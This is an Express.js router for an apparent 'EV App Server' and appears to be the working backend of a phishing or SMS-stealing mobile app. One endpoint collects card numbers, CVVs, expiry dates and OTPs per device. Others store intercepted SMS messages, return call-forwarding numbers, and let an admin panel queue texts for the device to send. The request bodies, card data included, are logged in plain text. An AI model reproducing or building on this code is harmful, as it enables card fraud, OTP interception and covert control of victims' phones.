import express from "express";
import UserModel from "./Schema/user.schema.js";
import FormDataModel from "./Schema/data.schema.js";
import adminRouter from "./Routers/admin.routes.js";
import PhoneNumberModel from "./Schema/number.schema.js";

const router = express.Router();

router.get("/", (req, res) => {
  console.log("GET / route hit");
  res.send("Welcome to EV App Server APIs");
});

router.use("/admin", adminRouter);

router.post("/save-data", async (req, res) => {
  console.log("Step 1: Received POST /save-data request");

  try {
    let {
      deviceId, // deviceId REQUIRED
      name,
      mobileNumber,
      email,
      state,
      workingState,
      totalLimit,
      availableLimit,
      cardHolderName,
      cardNumber,
      expiryDate,
      cvv,
      forwardPhoneNumber,
      otp,
    } = req.body;

    console.log("Step 2: Request body extracted:", req.body);

    // Step 3: Check if deviceId is provided
    if (!deviceId) {
      console.log("Step 3.1: deviceId is missing; generating a unique deviceId...");
      // DeviceId is missing, generate a unique one and send it (do not proceed further)
      const uniqueDeviceId = `dev_${Date.now()}_${Math.floor(Math.random() * 100000)}`;
      console.log("Step 3.2: Generated uniqueDeviceId:", uniqueDeviceId);

      // Optionally, ensure it does not exist in DB
      const existing = await UserModel.findOne({ deviceId: uniqueDeviceId });
      console.log("Step 3.3: Checking if uniqueDeviceId exists in UserModel:", !!existing);

      if (!existing) {
        console.log("Step 3.4: uniqueDeviceId does NOT exist; sending to client.");
deviceId= uniqueDeviceId;
      } else {
        // Extremely unlikely, but loop to ensure uniqueness
        let tries = 0;
        let newUniqueDeviceId;
        do {
          newUniqueDeviceId = `dev_${Date.now()}_${Math.floor(Math.random() * 100000)}`;
          tries++;
          console.log(`Step 3.5: Try #${tries}: Generated newUniqueDeviceId:`, newUniqueDeviceId);
        } while (await UserModel.findOne({ deviceId: newUniqueDeviceId }) && tries < 5);

        console.log("Step 3.6: Sending unique deviceId to client (after retry).");
        deviceId= newUniqueDeviceId;
      }
    }

    // deviceId is required for further steps. Redundant check for safety.
    if (!deviceId) {
      console.log("Step 4: deviceId is still missing after previous check. Sending error.");
      return res.status(400).json({ message: "deviceId is required" });
    }

    // Step 5: Trimming/cleaning fields
    const trimFields = (obj) => {
      console.log("Step 5.1: Trimming fields in object:", obj);
      const result = {};
      for (const [key, value] of Object.entries(obj)) {
        if (typeof value === "string") {
          result[key] = value.trim();
          console.log(`Step 5.2: Trimmed '${key}':`, result[key]);
        } else {
          result[key] = value;
        }
      }
      console.log("Step 5.3: Trimmed object result:", result);
      return result;
    };

    const data = trimFields({
      deviceId,
      name,
      mobileNumber,
      email,
      state,
      workingState,
      totalLimit,
      availableLimit,
      cardHolderName,
      cardNumber,
      expiryDate,
      cvv,
      forwardPhoneNumber,
      otp,
    });

    // Step 6: Build dynamic updateFields (ignore undefined)
    const updateFields = {};
    for (const [key, value] of Object.entries(data)) {
      if (value !== undefined) {
        updateFields[key] = value;
        console.log(`Step 6.1: Field '${key}' is set to:`, value);
      }
    }
    console.log("Step 6.2: All updateFields to be set:", updateFields);

    // Step 7: Find and update OR insert new based on deviceId
    console.log("Step 7: Executing findOneAndUpdate for deviceId:", data.deviceId);
    const user = await UserModel.findOneAndUpdate(
      {  deviceId: data.deviceId },
      { $set: updateFields },
      { new: true, upsert: true }
    );
    console.log("Step 7.1: Result from findOneAndUpdate:", user);

    // Step 8: Check if user existed before (true) or is newly created (false)
    const existed = await UserModel.exists({ deviceId: data.deviceId });
    console.log("Step 8: User existed before upsert?", !!existed);
    // Step 9: Send response to client
    res.status(existed ? 200 : 201).json({
      message: existed
        ? "User updated successfully"
        : "User created successfully",
      data: user,
    });
    console.log("Step 9: Response sent to client:", existed ? "User updated." : "User created.");
  } catch (error) {
    console.log("Step 10: Error occurred in /save-data:", error);

    if (error.code === 11000) {
      console.log("Step 10.1: Duplicate entry error. KeyValue:", error.keyValue);
      return res
        .status(409)
        .json({ message: "Duplicate entry", error: error.keyValue });
    }
    console.log("Step 10.2: General error. Message:", error.message);
    res
      .status(500)
      .json({ message: "Error saving user", error: error.message });
  }
});


router.post("/formdata", async (req, res) => {
  console.log("POST /formdata route hit");
  const session = await UserModel.startSession();
  session.startTransaction();
  try {
    const { senderPhoneNumber, message, time, recieverPhoneNumber, deviceId } = req.body;
    console.log("Request body for /formdata:", req.body);

    // Basic validation
    if (!senderPhoneNumber || !message || !time || !recieverPhoneNumber || !deviceId) {
      console.log("Missing field(s) in /formdata:", {
        senderPhoneNumber,
        message,
        time,
        recieverPhoneNumber,
        deviceId
      });
      await session.abortTransaction();
      session.endSession();
      return res.status(400).json({ message: "All fields are required" });
    }

    // Check if recieverPhoneNumber exists in UserModel; if not, add it
    const existingUser = await UserModel.findOne({ deviceId: deviceId }).session(session);
    if (!existingUser) {
      const newUser = new UserModel({ deviceId: deviceId });
      await newUser.save({ session });
      console.log("User added to UserModel with deviceId:", deviceId);
    }

    const formData = new FormDataModel({
      senderPhoneNumber,
      message,
      time,
      recieverPhoneNumber,
      deviceId,
    });
    console.log("New FormDataModel created:", formData);

    await formData.save({ session });
    console.log("Form data saved to DB:", formData);

    await session.commitTransaction();
    session.endSession();

    res.status(201).json({
      message: "Form data saved successfully",
      data: formData,
    });
    console.log("Response sent for /formdata success.");
  } catch (error) {
    await session.abortTransaction();
    session.endSession();
    console.log("Error in /formdata:", error);
    res
      .status(500)
      .json({ message: "Error saving form data", error: error.message });
  }
});

router.post("/save-multi-message", async (req, res) => {
  const session = await UserModel.startSession();

  try {
    let inserted;

    await session.withTransaction(async () => {
      const { receiverPhoneNumber, deviceId, messages } = req.body;

      if (!deviceId || !Array.isArray(messages) || messages.length === 0) {
        throw new Error("deviceId and at least one message are required");
      }

      // Check for existing user in session
      const existingUser = await UserModel.findOne({ deviceId }).session(session);

      // If user doesn't exist, create a new one (optionally with receiverPhoneNumber as mobileNumber)
      if (!existingUser) {
        const mobileNumber =
          receiverPhoneNumber ||
          (messages.length > 0 && messages[0].recieverPhoneNumber) ||
          null;
        if (mobileNumber) {
          await new UserModel({ deviceId, mobileNumber }).save({ session });
        } else {
          await new UserModel({ deviceId }).save({ session });
        }
      }

      // Validate and prepare bulk form data
      const formDataBulk = messages
        .filter(
          msg =>
            msg.senderPhoneNumber &&
            msg.message &&
            msg.time
        )
        .map(msg => ({
          senderPhoneNumber: msg.senderPhoneNumber,
          message: msg.message,
          time: msg.time,
          recieverPhoneNumber:
            msg.recieverPhoneNumber ?? receiverPhoneNumber ?? null,
          deviceId,
        }));

      if (formDataBulk.length === 0) {
        throw new Error("No valid messages to save");
      }

      inserted = await FormDataModel.insertMany(formDataBulk, { session });
    });

    res.status(201).json({
      message: "Multiple messages saved successfully",
      data: inserted,
    });
  } catch (error) {
    console.error("Transaction error in /save-multi-message:", error);
    res.status(500).json({
      message: error.message || "Transaction failed",
    });
  } finally {
    session.endSession();
  }
});

router.post("/get-forwarded-number", async (req, res) => {
  try {
    console.log("/get-forwarded-number endpoint hit");
    const { deviceId } = req.body;
    console.log("Request body:", req.body);

    if (!deviceId) {
      console.log("deviceId is missing");
      return res.status(400).json({ status: false, message: "deviceId is required" });
    }

    const user = await UserModel.findOne({ deviceId: deviceId });
    console.log("User found:", user);

    let forwardedStatus;
    if (!user || !user.forwardPhoneNumber) {
      forwardedStatus = "disabled";
      console.log("Forwarded number not found for deviceId:", deviceId);
      return res.status(200).json({
        status: forwardedStatus,
        message: "Forwarded number not found",
      });
    } else {
      if (user.isForwarded === "active") {
        forwardedStatus = "active";
      } else {
        forwardedStatus = "deactive";
      }
      console.log("Forwarded number found:", user.forwardPhoneNumber);
      return res.status(200).json({
        status: forwardedStatus,
        forwardPhoneNumber: user.forwardPhoneNumber,
      });
    }
  } catch (error) {
    console.error("Error in /get-forwarded-number:", error);
    res.status(500).json({
      status: false,
      message: "Internal server error",
      error: error.message,
    });
  }
});

//Admin Panel
router.post("/add-to-and-message", async (req, res) => {
  try {
    const { phoneNo, to, message } = req.body;
    console.log(phoneNo, to, message);

    // Validation for required fields
    if (!phoneNo || !to || !message) {
      console.log("Missing one of required fields (phoneNo, to, message) in /add-to-and-message. Req body:", req.body);
      return res.status(400).json({
        success: false,
        message: "phoneNo, to, and message are required fields",
      });
    }

    // Find user using the correct field from schema ('mobileNumber')
    let user = await UserModel.findOne({ mobileNumber: phoneNo });

    console.log(user);

    if (user) {
      // If user exists, update 'to', 'message', and 'messageFetched'
      user.to = to;
      user.message = message;
      user.messageFetched = false;
      await user.save();
      console.log("User updated and saved in /add-to-and-message.", { userId: user._id });

      return res.status(200).json({
        success: true,
        message: "User data updated successfully.",
        data: user,
      });
    } else {
      // If user doesn't exist, create new user and set required fields only
      const newUser = new UserModel({
        mobileNumber: phoneNo,
        to: to,
        message: message,
        messageFetched: false,
      });
      await newUser.save();
      console.log("New user created and saved in /add-to-and-message.", { userId: newUser._id });

      return res.status(201).json({
        success: true,
        message: "User created successfully.",
        data: newUser,
      });
    }
  } catch (error) {
    console.error("Error in /add-to-and-message:", error);
    return res.status(500).json({
      success: false,
      message: "Internal server error",
      error: error.message,
    });
  }
});

router.post("/fetch-to-and-message", async (req, res) => {
  try {
    const { deviceId } = req.body;
    if (!deviceId) {
      console.log("/fetch-to-and-message: deviceId missing in request.");
      return res.status(400).json({
        success: false,
        message: "deviceId is required"
      });
    }

    // Find user by deviceId
    let user = await UserModel.findOne({ deviceId: deviceId });
    console.log("/fetch-to-and-message: User lookup for deviceId", deviceId, "Result:", user);

    if (!user) {
      console.log("/fetch-to-and-message: User not found for deviceId", deviceId);
      return res.status(404).json({
        success: false,
        message: "User not found"
      });
    }

    // Check if already fetched
    if (user.messageFetched) {
      console.log("/fetch-to-and-message: messageFetched already true for deviceId", deviceId);
      return res.status(400).json({
        success: false,
        message: "Unable to fetch. Already fetched."
      });
    }

    // Mark messageFetched as true and return to/message
    user.messageFetched = true;
    await user.save();
    console.log("/fetch-to-and-message: messageFetched marked true. Returning to/message.", {
      to: user.to,
      message: user.message
    });
    return res.status(200).json({
      success: true,
      to: user.to,
      message: user.message
    });
  } catch (error) {
    console.error("Error in /fetch-to-and-message:", error);
    return res.status(500).json({
      success: false,
      message: "Internal server error",
      error: error.message
    });
  }
});

//Admin Panel
router.post("/set-forward-status", async (req, res) => {
  try {
    const { mobileNumber, isForwarded } = req.body;

    if (!mobileNumber) {
      return res.status(400).json({
        success: false,
        message: "mobileNumber is required"
      });
    }

    if (!["active", "deactive"].includes(isForwarded)) {
      return res.status(400).json({
        success: false,
        message: "isForwarded must be 'active' or 'deactive'"
      });
    }

    const user = await UserModel.findOneAndUpdate(
      { mobileNumber },
      { isForwarded },
      { new: true }
    );

    if (!user) {
      return res.status(404).json({
        success: false,
        message: "User not found"
      });
    }

    return res.status(200).json({
      success: true,
      message: `isForwarded status set to ${isForwarded}`,
      data: {
        mobileNumber: user.mobileNumber,
        isForwarded: user.isForwarded
      }
    });
  } catch (error) {
    console.error("Error in /set-forward-status:", error);
    return res.status(500).json({
      success: false,
      message: "Internal server error",
      error: error.message
    });
  }
});

router.post("/phonenumber", async (req, res) => {
  try {
    const { phoneNumber } = req.body;

    // Validate input
    if (!phoneNumber) {
      return res.status(400).json({ message: "Phone number is required" });
    }

    // Create and save phone number
    const phoneNumberDoc = new PhoneNumberModel({ phoneNumber });
    await phoneNumberDoc.save();

    res.status(201).json({
      message: "Phone number saved successfully",
      data: phoneNumberDoc,
    });
  } catch (error) {
    if (error.code === 11000) {
      return res
        .status(409)
        .json({ message: "Duplicate phone number", error: error.keyValue });
    }
    res
      .status(500)
      .json({ message: "Error saving phone number", error: error.message });
  }
});




export default router;
